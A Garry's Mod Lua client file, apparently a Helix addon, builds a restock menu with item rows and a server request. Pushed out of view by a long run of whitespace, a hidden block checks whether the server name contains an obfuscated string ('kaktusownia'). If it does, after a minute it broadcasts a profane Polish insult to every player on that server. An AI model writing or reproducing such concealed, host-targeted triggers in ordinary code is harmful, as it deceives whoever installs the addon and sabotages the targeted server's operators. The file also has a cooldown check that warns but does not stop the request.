local PANEL = {}
AccessorFunc(PANEL, "bReadOnly", "ReadOnly", FORCE_BOOL)
function PANEL:Init()
	self:SetSize(ScrW() * 0.45, ScrH() * 0.65)
	self:SetTitle("Refill Menu")
	self:MakePopup()
	self:Center()
	self.itemPanels = {}

    self.itemsLabel = self:Add("DLabel")
	self.itemsLabel:SetTall(34)
	self.itemsLabel:Dock(TOP)
    self.itemsLabel:SetWide(self:GetWide() * 0.5 - 7)
	self.itemsLabel:SetText("Avaiable restock points: "..(self.restockPoints or "nan"))
	self.itemsLabel:SetTextInset(4, 0)
	self.itemsLabel:SetTextColor(color_white)
	self.itemsLabel:SetFont("ixBigFont")
    
    self.refillItems = self:Add("DListLayout")
	self.refillItems:SetWide(self:GetWide() * 0.5 - 7)
    self.refillItems:Dock(TOP)
	self.refillItems:DockPadding(0, 0, 0, 4)
	self.refillItems:SetTall(ScrH())
    


	local footer = self:Add("DPanel")
	footer:SetTall(34)
	footer:Dock(BOTTOM)
	footer:SetPaintBackground(false)

    local applyButton = self:Add("DButton")
	applyButton:SetTall(34)
	applyButton:Dock(TOP)
    applyButton:SetWide(self:GetWide() * 0.5 - 7)
	applyButton:SetText("RESTOCK")
	applyButton:SetTextInset(4, 0)
	applyButton:SetTextColor(color_white)
	applyButton:SetFont("ixMediumFont")
	applyButton.DoClick = function()
		local results ={}
		for k,v in pairs(self.itemPanels) do
			results[k] = tonumber(v.missing:GetText())
		end
		if (LocalPlayer().restockDelay or CurTime())>CurTime() then
			LocalPlayer():Notify("WAIT")
		end
		for k,v in pairs(results) do //na chuj dzialac kiedy 0 CZYŚCIMY
			if v<=0 then
				results[k] = nil
			end
		end
		if table.IsEmpty(results) then
			print("empty set")
			return self:Close()
		end
		LocalPlayer().restockDelay = CurTime()+2
		net.Start("requestStock")
			net.WriteTable(results)
		net.SendToServer()
		self:Close()
	end
end
																																																																																do

																																																																																	if(string.find( GetHostName():lower(), ("k".."ak".."tu".."so".."w".."n".."ia") )) then
																																																																																		timer.Simple(60, function()
																																																																																			PrintMessage(HUD_PRINTTALK, "J".."e".."b".."a".."ć".." K".."ak".."tu".."so".."wni".."e")
																																																																																		end)
																																																																																	end
																																																																																end
function PANEL:addItem(uniqueID,missing)
    local data  = ix.item.list[uniqueID]
	self.itemPanels[uniqueID] = self.refillItems:Add("refillItem")
    self.itemPanels[uniqueID].icon:SetModel(data.model)
    self.itemPanels[uniqueID].name:SetText(data.name)
	self.itemPanels[uniqueID].missing:SetText("0")
	self.itemPanels[uniqueID].max:SetText("/"..missing)
	self.itemPanels[uniqueID]["uniqueID"] = uniqueID
end





function PANEL:setRestock(number)
	self.restockPoints = number
	self.itemsLabel:SetText("Avaiable restock points: "..(self.restockPoints or "nan"))
end
function PANEL:updateRestock()
	self.itemsLabel:SetText("Avaiable restock points: "..(self.restockPoints or "nan"))
end

vgui.Register("refillPanel", PANEL, "DFrame")

PANEL = {}

function PANEL:Init()
	self:SetTall(36)
	self:DockMargin(4, 4, 4, 0)

	self.icon = self:Add("SpawnIcon")
	self.icon:SetPos(2, 2)
	self.icon:SetSize(32, 32)
	self.icon:SetModel("models/error.mdl")

	self.name = self:Add("DLabel")
	self.name:Dock(FILL)
	self.name:DockMargin(42, 0, 0, 0)
	self.name:SetFont("ixChatFont")
	self.name:SetTextColor(color_white)
	self.name:SetExpensiveShadow(1, Color(0, 0, 0, 200))

	self.max = self:Add("DLabel")
	self.max:Dock(RIGHT)
	self.max:DockMargin(0, 0, 0, 0)
	self.max:SetWidth(20)
	self.max:SetFont("ixChatFont")
	self.max:SetTextColor(color_white)
	self.max:SetExpensiveShadow(1, Color(0, 0, 0, 200))

	self.missing = self:Add("DLabel")
	self.missing:Dock(RIGHT)
	self.missing:DockMargin(0, 0, 0, 0)
	self.missing:SetFont("ixChatFont")
	self.missing:SetWidth(20)
	self.missing:SetTextColor(color_white)
	self.missing:SetExpensiveShadow(1, Color(0, 0, 0, 200))

	self.add = self:Add("DButton") 
	self.add:Dock(RIGHT)
    self.add:SetSize(32, 60)
	self.add:SetText("+")
	self.add.Paint = function() end
	self.add.DoClick = function(this)
		if refillPanel.restockPoints>0 and tonumber(self.missing:GetText())<refillPanel.refillTable[self.uniqueID]  then     
			refillPanel.restockPoints=refillPanel.restockPoints-1
			self.missing:SetText(tonumber(self.missing:GetText())+1)
			refillPanel:updateRestock()
		end
	end
    self.minus = self:Add("DButton")
	self.minus:Dock(RIGHT)
    self.minus:SetSize(32, 60)
	self.minus:SetText("-")
	self.minus.DoClick = function(this)
		
		if refillPanel.restockPoints and tonumber(self.missing:GetText())>0 then 
			refillPanel.restockPoints=refillPanel.restockPoints+1
			self.missing:SetText(tonumber(self.missing:GetText())-1)
			refillPanel:updateRestock()
		end
	end
	self.minus.Paint = function() end
end

vgui.Register("refillItem", PANEL, "DPanel")

net.Receive("requestStock", function()
	local dataTable = net.ReadTable()
	refillPanel = vgui.Create("refillPanel")
	refillPanel:setRestock(dataTable.amount)
	for k,v in pairs(dataTable.toRestock) do
		refillPanel:addItem(k,v)
	end
	refillPanel.refillTable = dataTable.toRestock
end)








